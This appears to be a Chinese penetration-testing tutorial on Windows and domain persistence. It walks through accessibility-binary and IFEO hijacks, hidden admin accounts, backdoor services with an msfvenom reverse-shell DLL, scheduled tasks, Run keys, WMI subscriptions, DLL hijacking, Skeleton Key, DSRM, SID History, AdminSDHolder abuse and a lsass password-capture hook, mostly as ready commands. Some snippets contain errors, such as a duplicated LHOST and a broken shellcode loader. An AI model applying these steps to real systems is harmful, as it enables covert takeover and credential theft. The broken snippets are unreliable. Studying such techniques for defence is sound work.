

## 辅助功能镜像劫持

### shift后门

利用windows的辅助功能进行后门

最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序

```
屏幕键盘： C:\Windows\System32\osk.exe
放大镜： C:\Windows\System32\Magnify.exe
旁白： C:\Windows\System32\Narrator.exe
显示切换器 C:\Windows\System32\DisplaySwitch.exe
应用切换器： C:\Windows\System32\AtBroker.exe
```

在windows的古早版本中，我们可以使用copy命令来使用cmd命令覆盖sethc.exe文件(我理解的后门是将这里更换为自己免杀过的木马文件)

或许你在尝试时会遇到拒绝访问这样的问题

![shift_faild](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_faild.png)

这种情况需要把当前目录的所有文件改为管理员组

```
takeown  /f  c:\windows\system32\*.*  /a  /r  /d  y  # 获取整个文件夹及其下面子目录文件的所属权
cacls c:\windows\system32\*.* /T /E /G administrators:F # 将所有c:\windows\system32\目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制(删除原有NTFS权限设置)
```

![shift_win](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_win.png)

成功覆盖该文件，当连续按5次shif时，会导致该漏洞

![shift_try](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_try.png)

会开启一个cmd命令行，对其他辅助工具的运用思路基本一致，攻击者可以通过在远程的桌面连接按5下shift，即可获得一个命令行，如果有SYSTEM权限，我们即可RDP HIJacking

![shift-rdp-hijiacking](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/shift-rdp-hijiacking.png)

执行tscon 1即可不需要任何凭据登录到administrator![shift-rdp-win](E:\blog\source\_posts\渗透测试\内网体系建设\内网权限持久化\shift-rdp-win.png)

### 映像劫持(IFEO)

#### What is IFEO

IFEO 是 Windows 操作系统中的一个功能，它代表 "Image File Execution Options"（图像文件执行选项）。IFEO 允许开发人员对可执行文件进行调试和修改，以实现各种调试和兼容性方面的目的。

通过 IFEO，可以为特定的可执行文件或进程指定调试器或其他注入程序。当目标可执行文件或进程启动时，系统会检查是否存在与其相关联的 IFEO 条目。如果存在，则系统会启动指定的调试器或注入程序，并将其附加到目标进程上。

注意：使用IFEO最低权限需要管理员权限或等效的权限

##### Debugger

+ 利用

当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。

+ 可视化手动修改

手动修改注册表，添加debugger字段

![debugger_by_hand](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/debugger_by_hand.png)

启动该程序时就会启动cmd

##### GlobalFlag

在Windows中，关于程序的静默退出监视（Silent Exit Monitoring）是指对正在运行的程序进行实时监控，并在程序退出时自动采取相应的操作，而无需人工干预或弹出任何用户界面。

IFEO还可以在指定程序静默退出时启动任意监控程序，可以通过设置注册表来达到该效果

```shell
#启动对记事本的静默退出监视，需要在CurrentVersion注册一个GlobalFlag
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
#启动windows错误的进程报告WerFault.exe,它将成为reverse_tcp.exe的父进程
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
#将监视器进程设置为reverse_tcp.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\reverse_tcp.exe" 
```

当用户关闭已开启的记事本时，会启动WerFault进程，它的子进程为我们设定的的后门程序。修改为cmd.exe可以更直观的看到

![werfaylt-cmd](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/werfaylt-cmd.png)

## 常见系统后门技术

### 创建影子账户

影子账户其实就是隐藏起来的账户，只能在注册表中看到该账户的信息，对于该账户的创建，我们需要拥有管理员权限

+ 执行下列命令创建hacker$账户

  ```
  net user hacker$ hacker@123 /add
  ```

  $代表创建的账号是隐藏账户，无法从命令行直接查询，此时创建的账户为标准用户，需要修改注册表来使其获得管理员权限

  将hacker$用户添加到管理员组中

  ```
  net localgroup administrators hacker$ /add
  ```

+ 用注册表中administrator对应的000001F4中F的值替换hacker$用户对应的值

​		![reg-F-tihuan](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/reg-F-tihuan.png)

该过程其实是hacker$用户劫持了administrator用户的RID,达到完全控制的目的

+ 导出注册表

  将Name下的hacker$用户导出，并导出对应的二进制值表

+ 删除hacker$用户

  ```
  net user hacker$ /del
  ```

  此时在命令行和用户组中都看不到hacker$用户了

  ![looklook-user](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/looklook-user.png)

​		双击导出的注册表，将值重新添加到表中

​		但是我们可以通过`net user hacker$`来查看hacker$用户的信息

![shadow-user](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/shadow-user.png)

至此影子用户创建完成

#### 利用

远程登录，此时登录会收到限制，需要在控制主机上手动添加允许连接(远程连接需要关闭鉴权和防火墙)

![remote-user-add](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/remote-user-add.png)

```shell
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 #关闭鉴权
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow #配置防火墙允许连接
```

### 系统服务后门

#### 新建系统服务

将二进制文件路径设置为服务启动值，并将系统服务设置为自启动，当服务或系统重启时，服务会执行二进制文件

+ 执行以下命令，添加系统服务

  ```
  sc create Backdoor binpath= "cmd.exe /K c:\reverse_tcp.exe" start= "auto" obj= "LocalSystem"
  #start:设置启动模式为自动
  #obj : 指定启动类型，指启动服务的权限
  ```

+ 当系统重启或服务重启时就会执行指定的exe

(感觉和横向中利用系统服务进行横向是一个方法，只不过运用的场景不同，启动的权限和目的不同)

#### 利用现有的系统服务

通过`sc config`命令修改服务的binpath值，或是修改注册表中ImagePath选项来指定目标二进制文件

#### 利用svchost.exe加载

在Windows操作系统中，svchost.exe（Service Host）是一个关键的系统进程，它负责托管和运行多个服务.每个svchost.exe进程加载一个或多个DLL文件，这些文件包含实际的服务代码。

![svchost-rpc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/svchost-rpc.png)

-k RPCSS标识该服务属于RPCSS组，在子注册表parameters下能够看到调用的dll文件

![svchost-parameters](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/svchost-parameters.png)

当服务启动时，就会加载对应的dll文件,并根据dll文件提供对应的服务

svchost.exe中需要启动的服务都要到

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Winodws NT\CurrentVersion\Svchost`表下注册

![regedic_svchsot](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/regedic_svchsot.png)

攻击者可以通过svchost.exe加载恶意dll文件，具有较高的隐蔽性

+ 通过msf生成恶意dll文件

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.131 LHOST=4444 -f dll -o msf.dll
  ```

+ 将生成的DLL文件上传到目标主机system32目录下并执行以下命令注册服务

  ```shell
  #创建名为backdoor的服务，以svchost加载的方式启动，服务分组为RDPCS
  sc create Backdoor binpath= "C:\Windows\System32\svchost.exe -k RDPCS" start= auto obj= LocalSystem
  #将Backdoor的服务启动时加载的dll文件改为msf.dll
  reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "c:\Windows\System32\msf.dll"
  #配置服务描述
  reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v Description /t REG_SZ /d "windows xxx service"
  #配置服务显示名称
  reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v DisplayName /t REG_SZ /d "Backdoor"
  #创建新的服务分组RDPCS，并将Backdoor添加进去(注册服务)
  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvc /t REG-MULTI_SZ /d Backdoor
  ```

  当系统重启时，会得到shell

### 计划任务后门

 通过创建计划任务，使目标机器定时执行我们上传的后门文件，执行下列命令，在目标主机上创建计划任务

```shell
schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR c:\Windows\system32\reverse_tcp.exe /RU System /F 
```

该命令通过创建名为Backdoor的计划任务，每天早上8点以SYSTEM权限执行一遍隐藏的shell脚本

注意：以 SYSTEM权限运行服务，就要有管理员权限

执行下列命令，创建一个每60秒执行的计划任务

```
schtasks /Create /TN Backdoor /SC minute /MO 1 /TR c:\windows\system32\reverse_tcp.exe /RU System /F
```

关于计划任务管理库：windows下计算机管理中，计划任务管理库内的计划任务是以类似文件夹中文件的形式存在的，为了提高计划任务的隐蔽性，我们最好是遵守这个规则

```shell
schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /SC daily /ST 08:00 /MO 1 /TR c:\Windows\system32\reverse_tcp.exe /RU System /F 
```

这条命令将在\Microsoft\Windows\AppTask路径下创建一个名为AppRun的后门程序

![apptaskapprun](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/apptaskapprun.png)

### 启动项\注册表键后门

通过将后门程序添加到系统自启动文件夹或利用注册表键来进行权限持久化

+ 系统自启动文件

  ```shell
  #位于以下文件夹的程序在指定用户登陆时启动
  C:\Users\<username>\AppDate\Roaming\Microsoft\Windows\Start
  C:\Users\<username>\AppDate\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  #位于以下目录中的程序将在所有用户登陆时启动
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  ```

  利用该方法，只需要把后门程序丢到对应的目录下就行了

+ 注册表运行键（Run Keys）

  当用户登录时，系统会依次检查位于注册表运行键 (Run Keys)中的程序，并在用户登录的上下文中启动。Windows系统默认创建以下运行键，修改HKEY_LOCAL_MACHINE下的运行键需要拥有管理员权限

  ```shell
  #用户级的runkeys(当前用户登录时启动)
  \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
  #系统级的runkeys(所有用户登录时都会启动)
  \HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  \HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
  \HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
  \HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
  ```

  注意：由于windows版本的不同，注册表也不一定相同，例如RunServicesOnce就已经在较高版本中进行废弃

  执行以下命令，在注册表运行键中添加一个名为"Backdoor"的键，并将将键指向后门程序的绝对路径
  
  ```shell
  reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\reverse_tcp.exe"
  ```
  
  当目标重新登录主机时将会上线

![regadd-hkey-backdoor](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/regadd-hkey-backdoor.png)

+ Winlogon helper

  windows系统的组件之一，用于处理与用户有关的行为，例如登录，注销，加载配置文件，锁定屏幕等，这些操作通过注册表进行设置![winlogon](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/winlogon.png)

  在表"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"下设定着用户行为的值

  ```shell
  #用户登陆时执行的默认shell路径,默认为explorer.exe
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell 
  #windows身份验证期间执行的初始化程序(登录成功后)，默认为userini.exe
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
  ```

  执行以下命令，添加可执行程序

  ```shell
  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe,reverse_tcp.exe" /f 
  ```

  当用户再次登录成功时，windows会在加载userinit.exe进行初始化的同时加载reverse_tcp.exe

  注意：请保持原有的程序依然存在，为了以,的形式分隔加载的程序，需要将后门程序添加到相应的路径

+ Port Monitors

  打印后台处理服务(Print Spooler)负责管理windows系统的打印作业。与该服务的交互是通过Print Spooler API实现的，其中包含的函数AddMonitor能够将DLL注入spoolsv.exe进程，以实现相应功能，并通过创建注册表键，实现权限持久化

  条件：最低为管理员级别的权限

  1.生成64位的恶意DLL文件

  2.将生成的恶意DLL文件上传到c:\windows\system32目录下，执行以下命令，通过编辑注册表安装一个端口监视器

  ```shell
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor" /v "Driver" /t REG_SZ /d "reverse_tcp.dll"
  ```

  ![test-monitor](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/test-monitor.png)

   当系统重启时，Print Spooler服务会加载Monitor注册表下的全部子键，并以SYSTEM权限加载Driver对应的reverse_tcp.dll文件

## 事件触发执行

### 利用WMI订阅事件

在横向移动中可以利用WMI订阅事件来上线，同样可以利用订阅事件来触发后门， 通过在目标主机上创建永久性的订阅事件，获得持续的权限

+ 手动利用

  手动利用需要创建事件过滤器和事件消费者并进行绑定

  ```powershell
  # 创建一个名为TestFilter的事件过滤器
  $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name = "TestFilter"
      Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUptime >= 240 AND TargetInstance.SystemUptime < 325"
      QueryLanguage = 'WQL'
  }
  $EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs
  
  # 创建一个名为TestConsumer的事件消费者，在指定事件发生时执行命令
  $CommandLineEventConsumerArgs = @{
      Name = "TestConsumer"
      CommandLineTemplate = "cmd.exe"
  }
  $EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs
  
  # 绑定过滤器和事件消费者
  $FilterConsumerBindingArgs = @{
      Filter = $EventFilter
      Consumer = $EventConsumer
  }
  $FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs
  ```

  执行上述命令，目标机器会在5分钟内执行后门程序(可以通过将上述代码保存为ps1文件进行执行)

+ 相关辅助工具

  Sharp-WMIEvent在横向移动中可以用来在远程主机上执行命令，同样可以用来在控制机器上部署订阅事件

  执行以下命令，利用该工具在本地部署一个订阅事件

  ```
   Sharp-WMIEvent -Trigger UserLogon -Command "cmd.exe /c C:\Windows\Sytem32\reverse_tcp.exe"
  ```

  ![sharp-wmievent](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/sharp-wmievent.png)

  这将部署一个随机命名的永久事件订阅，每当用户登录时将会执行恶意程序并上线

  msf中有可以直接利用订阅事件的模块

  ```
  exploit/windows/local/wmi_persistence
  ```

  可通过自行设置trigger来控制事件的触发

### 利用屏幕保护程序

屏幕保护程序是windows的一项功能，就是长时间没有动作自动启动的程序，例如熄屏等操作，这些操作由.scr可执行程序文件组成，能够在注册表中找到。

系统注册表项`HKEY_CURRENT_USER\Control Panel\Desktop`下储存了用来设定屏幕保护程序的键值

![scenn](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/scenn.png)

```
SCRNSAVE.EXE 设定屏幕保护程序的路径，指向.scr为扩展名的可执行文件
ScreenSaveActive 屏幕保护程序的启动设置，1为启动
ScreenSaverIsSecure 设置是否需要密码解锁，0表示不需要
ScreenSaveTimeOut 设置执行屏幕保护程序之前用户不活动的超时时间
```

注意：默认只有ScreenSaveActive存在，其余三个需要自行创建

执行以下命令，修改注册表

```shell 
#将屏幕保护程序的启动程序指向上传的后门程序,这里是scr和exe都可以
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Windows\System32\reverse_desktop.exe"
#将屏幕保护程序开启，设定值为1(默认为1)
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1
#设定不需要密码解锁
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0"
#设定用户的超时时间,这里为60秒
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60"
```

用户一段时间不活动后，即可收到返回的shell

### DLL劫持

通过将同名的恶意dll文件放在合法的dll文件所在路径前的搜索位置，在启动程序时会首先加载恶意的dll文件 ,可以利用DLL注入进行权限维持，需要拥有管理员权限

#### 劫持应用程序

以notepad++为例，通过process monitor观察notepad++加载的dll文件

![notepad++](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/notepad%2B%2B.png)

发现一个名为mscoree.dll的文件丢失，我们可以创建一个同名的dll文件，并放到目标目录下进行加载，后续也没有继续加载该dll文件

(后面发现这个版本的notepad++找不到可以利用的dll文件，干脆演示一下做法)

找到可以利用的dll文件之后，通过AheadLib生成恶意利用的cpp文件

![aheadlib](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/aheadlib.png)

编辑生成的cpp文件，添加DoMagic函数，用于添加恶意代码

```cpp
DWORD WINAPI DoMagic(LPVOID lpParameter) {
	unsigned char shellcode[] =


	void* exec = VirtualAlloc(0, sizeof shellcode, MEN_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec);
	return 0;
}
```

在shellcode处添加生成的恶意代码，在DllMain添加调用规则

```cpp
		HANDLE hThread = CreateThread(NULL, 0, DoMagic, 0, 0, 0);
		if (hThread) {
			CloseHandle(hThread);
		}
```

将生成的DLL文件重命名，放到原有文件的目录下即可

注意：DLL劫持应用程序分为劫持已有的dll文件和not found的dll文件，劫持的原始dll文件为version.dll，位于system32下，因此需要将pragma语句指向c:\windows\system32\version

#### 劫持系统服务

MSDTC(分布式事务出力协调器)是windows系统服务。启动MSDTC时medtc.exe会动态加载dll文件

![oci-dll](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/oci-dll.png)

oci.dll文件为not found,并且没有在下文中出现过，能过直接使用msf生成dll文件进行代替，将生成的dll文件上传至system32目录下即可 

某些版本的系统下MSDTC是需要手动启动的，可通过命令将其修改为自启动

```
sc config msdtc start= "auto"
```

## 常见域后门技术

### 创建Skeleton Key域后门

Skeleton Key即万能钥匙。为了实施此攻击，攻击者必须具有域管理员权限。必须在每个域控制器上执行此攻击才能完全入侵，但即使针对单个域控制器也可能有效。重新启动域控制器将删除此恶意软件，攻击者必须重新部署它.

该攻击通过lsass进程实，统一认证的密码存储在内存中，可用于所有域用户的账户认证，现有密码也将继续有效，当DC重启后需要重新部署。

+ 上传mimikatz到域控制器，执行以下命令创建Skeleton Key后门

```
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```

![skeleton-key](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/skeleton-key.png)

出现如上界面即部署成功，现在可以使用统一的密码mimikatz进行登录

+ 缓解措施

  本地安全机构(LSA)保护策略，用于防止对lsass.exe进程的内存读取和代码注入。通过执行以下命令，开启和关闭LSA保护策略

  ```
  #开启LSA保护策略
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f 
  #关闭LSA保护策略
  reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
  ```

  开启LSA保护措施后，将无法使用mimikatz直接创建万能钥匙

  可以使用mimikatz自带的mimidrv.sys驱动文件，进行LSA的绕过

![lsabypass-mimikatz](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/lsabypass-mimikatz.png)

### 创建DSRM域后门

目录服务还原模式(DSRM)是域控制器的安全模式启动项，用于使服务器脱机，进行紧急维护，在域控制器上DSRM的密码实际上就是本地管理员账户的密码。通过在域控制器上运行NTDSUtil,可以为DSRM账户修改密码

ntdsutil 是 Windows 操作系统中的一个命令行实用工具，而不是一个服务。它用于管理和维护 Active Directory 数据库。Active Directory 是一种目录服务.

```shell
#进入ntdsutil
ntdsutil
#进入DSRM账户密码设置模式
set dsrm password
#在当前域控制器上恢复DSRM密码
reset password on server null
#sync from domain account <username>与指定域用户的密码相同
#输入新密码
<password>
#再次输入新密码
<password>
#退出dsrm密码设置模式
q
#退出ntdsutil
q
```

![dsrm-pwd-reset](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-pwd-reset.png)

+ 使用mimikatz获取dsrm账户的hash实现权限持久化(需要域管理员权限)

  执行以下命令

  ```
  mimikatz.exe "privilege::debug" " token::elevate" "lsadump::sam" exit
  ```

  读取本地SAM文件中dsrm账户的hash值

  ![mimikatz-dsrm-hash-dump](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/mimikatz-dsrm-hash-dump.png)

  修改DSRM账户的登陆模式，以允许该账户的远程登录。通过编辑注册表的DsrmAdminLogonBehavior键值来实现，DSRM账户可选用的登陆模式有以下三种

  ```
  0: 默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账户
  1：只有当本地AD,DS服务停止时，才可以使用DSRM管理员账户进行登录
  2：任何情况，都可以使用DSRM管理员账户登录域控制器
  ```

  执行以下命令，将DSRM的登陆模式改为2

  ```
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior  /t REG-DWORD /d 2 /f
  ```

  ![dsrm-model2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-model2.png)

  现在可以通过PTH，远程使用DSRM账户登录域控机器了

![dsrm-hash-login](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-hash-login.png)

### SID History利用

+ SID & SID History

  每个用户帐号都有一个对应的安全标识符（Security Identifiers，SID），SID用于跟踪主体在访问资源时的权限。如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。

  一个完整的SID包括：

  - 用户和组的安全描述
  - 48-bit的ID authority
  - 修订版本
  - 可变的验证值Variable sub-authority values

  例：S-1-5-21-310440588-250036847-580389505-500
  第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。
  可以注意到最后一个标志位为500，这个500是相对标识符（Relative Identifer, RID），账户的RID值是固定的。一般克隆用户原理就是篡改其他用户的RID值使系统认为对应用户是管理员。
  常见的RID：500-管理员 519-EA 501-Guest

  SID History是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户中，在域迁移中很适用。

+ SID History的利用

  通过将域管理员用户的SID添加到其他域用户的SID History中以维持权限的持久化，需要拥有域管理员级别的权限

  1.向域控制器上传mimikatz

  执行以下命令，将域管用户的SID添加到hacker用户的SID History中

  ```shell
  #mimikatz>2.1.0
  mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:hacker /new:Administrator" exit 
  #mimikatz<2.1.0
  mimikatz.exe "privilege::debug" "misc:addsid hacker ADSAdministrator" exit 
  ```

  2.通过powershell查看hacker用户的sid history

  ```shell
  Import-Module ActiveDirectory
  Get-ADUser Hacker -Properties SIDHistory
  ```

  3.通过hacker用户连接域控制器，可以是横向中的提供用户凭据的任意方法，登陆后可以通过whoami /priv查看到hacker用户拥有域管理员的所有权限

### 利用AdminSDHolder打造域后门

+ AdminSDHolder

  AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的System容器下用于管理和保护高权限用户或组的安全描述符，AdminSDHolder容器的主要目的是确保在域中具有高权限的用户和组（如域管理员、企业管理员等）不受非授权的更改。它通过定期检查和重置这些对象的安全描述符来实现这一目标，以防止恶意用户或恶意程序修改其权限。

  ![AdminSDHistory](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/AdminSDHistory.png)
  
  收保护的对象通常包括系统的特权用户和重要的组，例如Administrator,Domain Admins,Enterprise Admins以及Schema Admins等
  
  在活动目录中，属性adminCount用来标记特权用户和组。对于特权用户和组来说，该属性被设置为1，通过AdFind查询adminCount属性设置为1的对象，可以找到所有被保护的特权用户和组。
  
  ```shell
  #枚举受保护的用户
  Adfind.exe -b DC=hack,DC=com -f "&(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
  #枚举受保护的组
  Adfind.exe -b DC=hack,DC=com -f "&(objectcategory=group)(admincount=1)" -dn
  ```
  
  通过ActiveDirectory模块查询
  
  ```powershell
  #查找用户
  Import-Module ActiveDirectory
  Get-ADObject -LDAPFilter "(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))" |select name
  #查找组
  Get-ADObject -LDAPFilter "(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))" |select name
  ```
  
  默认状态下，系统每60分钟检查受保护对象的安全描述符，将受保护对象的ACL与AdminSDHolder容器的ACL进行比较，不一致的话，系统将会把受保护对象的ACL强制修改为AdminSDHolder的ACL，通过SDProp进程来完成。
  
  + 操作AdminSDHolder对象的ACL
  
    通过powerview向AdminSDHolder容器添加一个ACL对象，使普通用户hacker对AdminSDHolder有完全控制权
  
    ```powershell
    Import-Module .\PowerView.ps1
    Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName hacker -Verbose -Rights All
    ```
  
    ![AdminiSDHolder-user-add](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/AdminiSDHolder-user-add.png)
  
    添加好后可以查看一下
  
    ```powershell
    Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
    ```
  
    ![adduser](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/adduser.png)
  
    能够看到hacker用户对AdminSDHolder有了完全控制权限，此时hacker用户虽然没有在域管理组中，但是能够添加指定用户到域管理员组
  
    ![contrpl](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/contrpl.png)
  
    
  
    + 通过powerview删除AdminSDHolder中指定用户的ACL
  
      ```
      Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=hack,DC=com" -PrincipalIdentity hacker -Rights All -Verbose
      ```

#### 操控SDPROP

+ 修改运行频率

  通过注册表修改

  ```
  reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60
  ```

+ 强制运行

  1. 运行->`LDP.exe`
  2. 然后选择菜单：`连接->连接`，服务器输入你当前的机器名，端口默认为`389`
  3. 然后绑定凭证，选择`绑定为当前登录的用户`，如果选择`与凭据绑定`需要输入用户名和密码
  4. 然后`浏览->修改`，在`属性`选项卡中输入`FixUpInheritance`。在值字段中输入`Yes`。操作选择`添加`，然后单击`输入`，最后运行即可。

  ![ldp](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/ldp.png)

### HOOK PasswordChangeNotify

PasswordChangeNotify在微软的官方文档中称为PsamPasswordNotificationRoutine，是一个API.当用户重置密码时windows会检查新密码是否符合复杂性，符合要求，LSA则调用PasswordChangeNotify函数在系统中同步密码。由于在调用时，用户的账户和密码是通过明文形式进行传输。攻击者可以通过HOOK技术，劫持函数的执行流程，从而获取传入的明文密码。

+ 利用工具

  Hook-PasswordChange.dll

  Invoke-ReflectivePEInjection.ps1

+ 具体利用

  1.将工具上传到域控机器，通过Invoke将dll注入到 lsass进程当中

  ```powershell
  #导入Invoke-ReflectivePEInjection.ps1
  Import-Module .\Invoke-ReflectivePEInjection.ps1
  #读取Hook-PasswordChange.dll并将其注入到lsass进程
  $PEBytes = [IO.File]::ReadALLBytes('C:\HookPasswordChange.dll')
  Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass
  ```

  环境有问题，一直缺少了一个动态链接库，干脆换了一个一键式的ps脚本
  
  ```powershell
  PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
  ```
  
  2.当网络管理员修改密码时，新的账户和密码会被保存到C:\Windows\Temp下的passwords.txt文件
  
  也可以通过修改脚本的方式来将修改过的密码传递到远程服务器上
  
  项目地址：https://github.com/kevien/PasswordchangeNotify

## DCSync攻击技术

### 原理

一个域环境可以有多个域控制器，为了防止DC出现意外导致域内瘫痪，所以都是要布置多台域控作为AD域的备份，或者是部署多台域控制器，方便在站点位置本地提供身份验证和其他策略。当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步。**而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC / DCE/RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI**。

